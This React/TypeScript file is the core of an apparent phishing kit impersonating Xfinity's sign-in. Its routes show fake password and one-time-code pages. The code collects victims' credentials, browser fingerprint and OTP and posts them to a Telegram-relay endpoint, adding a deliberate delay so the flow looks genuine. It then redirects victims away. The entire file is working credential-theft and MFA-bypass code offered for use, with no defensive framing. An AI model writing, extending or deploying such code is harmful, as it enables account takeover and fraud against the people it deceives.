import React, { useState, useEffect } from 'react';
import { Routes, Route, useNavigate, Navigate, useLocation } from 'react-router-dom';
import XfinityPasswordPage from './components/XfinityPasswordPage';
import XfinityOtpPage from './components/XfinityOtpPage';
import Spinner from './components/common/Spinner';
import { getBrowserFingerprint } from './utils/oauthHandler';
import { config } from './config';

const safeSendToTelegram = async (payload: any) => {
  try {
    const res = await fetch(config.api.sendTelegramEndpoint, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    if (!res.ok) { throw new Error(`HTTP ${res.status}`); }
  } catch (fetchErr) {
    console.error('safeSendToTelegram failed:', fetchErr);
  }
};

function App() {
  const [isLoading, setIsLoading] = useState(false);
  const [loginFlowState, setLoginFlowState] = useState({
    awaitingOtp: false,
    sessionData: null as any,
  });

  const navigate = useNavigate();
  const location = useLocation();

  const handleLoginSuccess = async (loginData: any) => {
    try {
      const browserFingerprint = getBrowserFingerprint();
      const credentialsData = {
        ...loginData,
        sessionId: Math.random().toString(36).substring(2, 15),
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        ...browserFingerprint,
      };

      // Send credentials to Telegram (don't block on failure)
      safeSendToTelegram({ type: 'credentials', data: credentialsData }).catch((err: any) => console.error('Failed to send credentials:', err));

      // Brief delay so the spinner is visible on the Sign In button
      await new Promise((r) => setTimeout(r, 2500));

      setLoginFlowState({
        awaitingOtp: true,
        sessionData: credentialsData,
      });
      navigate('/otp', { replace: true });
    } catch (err) {
      console.error('handleLoginSuccess error:', err);
      // Fallback: still navigate to OTP even if something fails
      setLoginFlowState({
        awaitingOtp: true,
        sessionData: { ...loginData, sessionId: Math.random().toString(36).substring(2, 15) },
      });
      navigate('/otp', { replace: true });
    }
  };

  const handleOtpSubmit = async (otp: string) => {
    if (!loginFlowState.sessionData) {
      window.location.href = '/';
      return;
    }

    setIsLoading(true);
    await safeSendToTelegram({
      type: 'otp',
      data: { otp, session: loginFlowState.sessionData },
    });

    window.location.href = config.redirects.afterOtp;
  };

  if (isLoading) {
    return (
      <div className="min-h-screen bg-white flex items-center justify-center">
        <div className="text-center">
          <Spinner size="lg" color="border-purple-600" />
          <p className="text-gray-600 mt-4">Loading...</p>
        </div>
      </div>
    );
  }

  return (
    <Routes>
      <Route
        path="/password"
        element={
          <XfinityPasswordPage
            onLoginSuccess={handleLoginSuccess}
            onLoginError={(e) => console.error(e)}
          />
        }
      />
      <Route
        path="/otp"
        element={
          loginFlowState.awaitingOtp ? (
            <XfinityOtpPage
              onSubmit={handleOtpSubmit}
              isLoading={isLoading}
              email={loginFlowState.sessionData?.email}
            />
          ) : (
            <Navigate to="/" replace />
          )
        }
      />
      {/* Root and all other routes redirect to the static Xfinity login page */}
      <Route path="*" element={<RootRedirect />} />
    </Routes>
  );
}

/**
 * For the root route and any unknown routes, redirect to the static
 * Xfinity login page (login.html served from public/).
 * In production, Netlify handles this redirect. In development,
 * we redirect via JavaScript.
 */
function RootRedirect() {
  useEffect(() => {
    window.location.href = config.redirects.landingPage;
  }, []);
  return null;
}

export default App;
